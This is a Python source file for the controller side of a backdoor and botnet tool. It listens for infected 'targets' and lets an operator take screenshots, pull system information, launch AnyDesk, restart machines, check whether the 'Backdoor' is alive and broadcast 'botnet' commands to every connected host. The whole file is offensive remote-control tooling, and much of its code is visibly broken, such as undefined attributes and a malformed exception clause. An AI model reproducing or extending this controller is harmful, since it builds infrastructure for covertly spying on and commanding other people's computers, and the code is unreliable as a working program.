import os.path
import ntpath
import select

from colorama import init
from termcolor import colored
import subprocess
import threading
from threading import Thread
from datetime import datetime
import random
import socket
import time
from PIL import ImageGrab, Image

init()


class Client(Thread):
    def __init__(self, ip, port, clients):
        Thread.__init__(self, name=f"{ip} | {port}")
        self.ip = ip
        self.port = port
        self.clients = clients
        self.d = datetime.now().replace(microsecond=0)
        self.dt = str(self.d.strftime("%b %d %Y | %I-%M-%S"))
        self.port = 55400
        self.stop_threads = False
        self.stop_pulse = threading.Event()
        self.stop_pulse.set()
        self.stop_poke = threading.Event()
        self.stop_poke.set()
        self.systeminfofile = rf"c:\Users\{os.getlogin()}\Desktop\systeminfo " \
                              rf"{self.ip} {str(self.ip)} {self.dt}.txt"

        welcome = "Connection Established!"
        conn.send(f"@Server: {welcome}".encode())
        if conn not in targets:
            targets.append(conn)
            ips.append(self.ip)
            connections[conn] = self.ip

            sconnections[conn, self.ip] = self.d
            clients += 1
            cmd.server()

    def shell(self):
        commands = ['screenshot', 'anydesk', 'system info', 'restart', 'cmd', 'q', 'exit']
        show_shell_commands()

        while True:
            cmd = input(f"@{ip}: ")
            if str(cmd).lower() == "q":
                break

            elif str(cmd).lower() == 'screenshot' or int(cmd) == 1:
                d = datetime.now().replace(microsecond=0)
                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
                chunk = 1000000
                print(f"working...")
                conn.send('screen'.encode())
                filenameRecv = conn.recv(1024)
                conn.send("OK filename".encode())
                name = ntpath.basename(str(filenameRecv))
                print(name)
                with open(filenameRecv, 'wb') as file:
                    try:
                        fileRecv = conn.recv(chunk)
                        file.write(fileRecv)

                    except len(fileRecv) == 0:
                        break

                # print(f"[{colored('*', 'green')}]Received: {name[:-2]} \n")
                conn.send(f"Received file: {name[:-1]}\n".encode())
                msg = conn.recv(1024).decode()
                print(f"{msg}")
                continue

            elif str(cmd).lower() == 'anydesk' or int(cmd) == 2:
                d = datetime.now().replace(microsecond=0)
                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
                conn.send('anydesk'.encode())
                msg = conn.recv(1024).decode()
                print(f"{msg}")
                continue

            elif str(cmd.lower()) == 'system info' or int(cmd) == 3:
                d = datetime.now().replace(microsecond=0)
                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
                print(f"working...")
                conn.send('bt'.encode())
                filenameRecv = conn.recv(1024)
                time.sleep(10)
                fileRecv = conn.recv(4096).decode()
                print(fileRecv)
                newFile = fr"{fileRecv}"

                with open(filenameRecv, 'w') as file:
                    file.write(fileRecv)

                name = ntpath.basename(str(filenameRecv))
                print(f"[{colored('*', 'green')}]Received: {name[:-2]} \n")
                conn.send(f"Received file: {name[:-1]}\n".encode())
                continue

            elif str(cmd).lower() == "restart" or int(cmd) == 4:
                d = datetime.now().replace(microsecond=0)
                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
                sure = input("Are you sure you want to restart [Y/n]?")
                while True:
                    try:
                        if str(sure).lower() == "y":
                            conn.send('restart'.encode())
                            break

                        elif str(sure).lower() == "n":
                            break

                    except TypeError:
                        print("Wrong Input")

                continue

            elif str(cmd).lower() == 'cmd' or int(cmd) == 5:
                d = datetime.now().replace(microsecond=0)
                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
                conn.send(cmd.encode())
                continue

            elif str(cmd).lower() == "q" or int(cmd) == 6:
                d = datetime.now().replace(microsecond=0)
                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
                conn.send(cmd.encode())
                break

            elif str(cmd) == "disconnect" or int(cmd) == 7:
                d = datetime.now().replace(microsecond=0)
                dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
                conn.send(cmd.encode())
                conn.shutdown(socket.SHUT_RDWR)
                conn.close()
                targets.remove(conn)
                ips.remove(ip)
                break

            else:
                if str(cmd).lower() not in commands or int(cmd) < 0 or int(cmd) > 7:
                    print(f"Wrong Command: '{cmd}'")
                    continue


class Command:
    def server(self):
        while True:
            welcome_menu()
            command = input("*CONTROL*->>$ ")
            if command == "help":
                print("\t\t" + f"{colored('=', 'blue')}" * 20, f"=> {colored('Command Center', 'red')} <=",
                      f"{colored('=', 'blue')}" * 20)
                print(f"\t\t[{colored('*', 'cyan')}]pulse                ----> "
                      f"Check ping to connected machines.")
                print(f"\t\t[{colored('*', 'cyan')}]ps                   ----> "
                      f"Pause Pulse Check.")
                print(f"\t\t[{colored('*', 'cyan')}]np                   ----> "
                      f"Show targets with dead pulse check.")
                print(f"\t\t[{colored('*', 'cyan')}]poke                 ----> "
                      f"Check if Backdoor is running.")

                print(f"\t\t[{colored('*', 'cyan')}]rsession #           ----> "
                      f"Remove session from target list.")
                print(f"\t\t[{colored('*', 'cyan')}]asession #           ----> "
                      f"Add session to targets list.")
                print(f"\t\t[{colored('*', 'cyan')}]connhist             ----> "
                      f"Show connections history.")
                print(f"\t\t[{colored('*', 'cyan')}]botnet + command     ----> "
                      f"Send a command to botnet.\n")

            elif command == "pulse":
                self.stop_pulse.clear()
                check_pulse_thread = threading.Thread(target=self.pulse_check,
                                                      name='Ping thread')
                check_pulse_thread.start()

            elif command == "ps":
                self.stop_pulse.set()
                print(f"[{colored('*', 'blue')}]Pulse check paused.")

            elif command == "np":
                if len(self.noping_ips) == 0:
                    print(f"[{colored('*', 'magenta')}]Target list is empty. run 'pulse' command to re-check.")

                count = 0
                for i in self.noping_ips:
                    print(f"[{colored(str(count), 'blue')}]: "
                          f"{colored(i, 'red')}")
                    count += 1
                continue

            elif command == "poke":
                self.stop_poke.clear()
                poke_thread = threading.Thread(target=self.poke, name='Poke Thread')
                poke_thread.start()

            elif command == "targets":
                if len(ips) == 0:
                    print(colored("[i]No connected targets.", 'magenta'))

                count = 0
                for ip in ips:
                    print(f"Session [{str(colored(str(count), 'cyan'))}]: {str(colored(ip, 'green'))}")
                    count += 1

            elif command[:8] == "session ":
                num = command[8:]
                while True:
                    try:
                        num = int(command[8:])
                        if num != 0 and num < len(targets):
                            print(f"No such session: {num}")
                            num = ''
                            raise IndexError

                        tarnum = targets[num]
                        ipnum = ips[num]
                        Client.shell(conn)

                    except (ValueError, IndexError):
                        print("Wrong Session")

                    break

            elif command[:9] == "rsession ":
                num = int(command[9:])
                tarnum = self.targets[num]
                ipnum = self.ips[num]
                self.targets.remove(tarnum)
                self.ips.remove(ipnum)
                print(f"[{colored('+', 'cyan')}]{colored(ipnum, 'yellow')} removed.")
                continue

            elif command[:9] == "asession ":
                num = int(command[9:])
                tarnum = self.noping_targets[num]
                ipnum = self.noping_ips[num]
                self.targets.append(tarnum)
                self.ips.append(ipnum)
                continue

            elif command == "connhist":
                c = 1
                for k, v in self.sconnections.items():
                    print(
                        f"[{colored(str(c), 'blue')}]{colored(str(k[1]), 'yellow')} | Time: {colored(v, 'blue')}")

                    c += 1

            elif command[:7] == "botnet ":
                sendall(command=command)

            elif command == "exit":
                for t in self.targets:
                    self.stop_threads = True
                    t.shutdown(2)
                    t.close()

            else:
                continue

    def sendall(self, command):
        try:
            for t in self.targets:
                t.send(command.encode())
                botnet = t.recv(16184).decode()
                if not botnet:
                    raise socket.error

                print(botnet)

        except socket.error as e:
            print(f"[{colored('-', 'red')}]{colored(e, 'red')}")
            for t in self.targets:
                for k, v in self.connections.items():
                    if k in self.targets:
                        t.shutdown(socket.SHUT_RDWR)
                        self.targets.remove(t)
                        self.ips.remove(v[0])
                        print(f"[{colored('*', 'blue')}]{colored(v[0], 'yellow')} "
                              f"has been removed from target list.")

    def pulse_check(self):
        print(f"[{colored('*', 'cyan')}]Running pulse check (type '{colored('ps', 'white')}' to pause)...")
        while not self.stop_pulse.is_set():
            if self.stop_pulse.is_set():
                break

            if len(self.targets) == 0:
                print(f"[{colored('*', 'yellow')}]No connected targets.")
                print(f"[{colored('*', 'blue')}]Stopping pulse check.")
                self.stop_pulse.set()
                break

            i = 0
            while i < len(self.ips):
                if i > len(self.ips):
                    i = 0
                    continue

                time.sleep(random.randint(2, 3))
                response = subprocess.call(["ping", "-n", "1", self.ips[i]],
                                           shell=True,
                                           stdout=subprocess.PIPE)
                if response == 0:
                    if self.stop_pulse.is_set():
                        break

                    print(f"\n[{colored('*', 'green')}]{colored(self.ips[i], 'green')}")
                    if self.ips[i] in self.noping_ips:
                        print(f"[{colored('*', 'green')}]{self.ips[i]} has been removed from no-ping list.")
                        self.noping_ips.remove(ips[i])
                        self.noping_targets.remove(targets[i])
                    i += 1

                else:
                    if self.stop_pulse.is_set():
                        break

                    print(f"[{colored('*', 'red')}]{colored(self.ips[i], 'red')}")
                    if self.ips[i] not in self.noping_ips:
                        self.noping_targets.append(self.targets[i])
                        self.noping_ips.append(self.ips[i])
                        print(f"[{colored('*', 'blue')}]{colored(ips[i], 'yellow')} "
                              f"has been added to the no-ping list.")

    def poke(self):
        i = 0
        callbacks = ['yes']
        print(f"[{colored('*', 'blue')}]Poking targets...")
        while not self.stop_poke.is_set():
            if self.stop_poke.is_set():
                break

            while i < len(self.ips):
                if i > len(self.ips):
                    i = 0
                    continue

                if len(self.targets) == 0:
                    print(f"[{colored('*', 'yellow')}]No connected targets.")
                    print(f"[{colored('*', 'blue')}]Stopping pulse check.")
                    break

                try:
                    for t in self.targets:
                        t.send('alive'.encode())
                        ans = t.recv(1024).decode()
                        if ans in callbacks:
                            print(f"\n[{colored('*', 'blue')}]{colored(self.ips[i], 'yellow')}: "
                                  f"{colored('Alive', 'green')}")
                            i += 1

                except socket.error as e:
                    print(f"[{colored('*', 'red')}]{colored(self.ips[i], 'yellow')} does not respond.")
                    if t in self.noping_targets:
                        print(f"\n[{colored('*', 'blue')}]{colored(self.ips[i], 'yellow')} "
                              f"has been removed from no-ping list.")
                        self.noping_targets.remove(t)
                        self.noping_ips.remove(ips[i])

                    if t in self.targets:
                        print(f"\n[{colored('*', 'blue')}]{colored(self.ips[i], 'yellow')} "
                              f"has been removed from target list.")
                        self.targets.remove(t)
                        self.ips.remove(ips[i])

                    i += 1
                    continue


def welcome_menu():
    print(f"\n[{colored('*', 'cyan')}]Connection from: IP: {colored(ip, 'green')} | "
          f"Port: {colored(port, 'green')} | Session: {colored(ips.index(ip), 'green')}")
    print("\t\t" + f"{colored('=', 'blue')}" * 20, f"=> {colored('Command Center', 'red')} <=",
          f"{colored('=', 'blue')}" * 20)
    print("\t\t" + f"{colored('=', 'blue')}" * 20, f"=> {colored('By Gil Shwartz', 'red')} <=",
          f"{colored('=', 'blue')}" * 20)
    print(f"\t\t[{colored('*', 'cyan')}]targets              ----> "
          f"Show connected machines.")
    print(f"\t\t[{colored('*', 'cyan')}]session #            ----> "
          f"Connect to session number. (Example: session 0)\n")


def show_shell_commands():
    print("\t\t" + f"{colored('=', 'blue')}" * 20, f"=> {colored('SHELL CONTROL', 'red')} <=",
          f"{colored('=', 'blue')}" * 20)
    print(f"\t\t[{colored('1', 'cyan')}]Screenshot      \t\t\t----> "
          f"Capture screenshot.")
    print(f"\t\t[{colored('2', 'cyan')}]Anydesk         \t\t\t----> "
          f"Start Anydesk")
    print(f"\t\t[{colored('3', 'cyan')}]System Info     \t\t\t----> "
          f"Show Station's System Information")
    print(f"\t\t[{colored('4', 'cyan')}]Restart         \t\t\t----> "
          f"Restart remote station")
    print(f"\t\t[{colored('5', 'cyan')}]cmd             \t\t\t----> "
          f"Go Back to Control Center (Connection stays alive")
    print(f"\t\t[{colored('6', 'cyan')}]q               \t\t\t----> "
          f"Go Back to Control Center (Connection stays alive")
    print(f"\t\t[{colored('7', 'cyan')}]Disconnect      \t\t\t----> "
          f"Close Connection and go back to Control Center\n")


if __name__ == '__main__':
    noping_live_connections = {}
    connections = {}
    sconnections = {}
    noping_targets = []
    noping_ips = []
    ips = []
    targets = []
    clients = 0
    listeners = []
    stop_threads = False
    threads = []
    port = 55400
    cmd = Command()
    print(f"[{colored('*', 'cyan')}]Listening...")
    listener = socket.socket()
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(('192.168.1.10', port))

    while True:
        listener.listen(10)
        read_sockets, write_sockets, error_sockets = select.select([listener], [], [])
        for sock in read_sockets:
            if stop_threads:
                break

            (conn, (ip, port)) = listener.accept()
            newThread = Client(ip, port, clients)
            newThread.start()
            threads.append(newThread)

        cmd.server()

        break

    for t in threads:
        t.join()
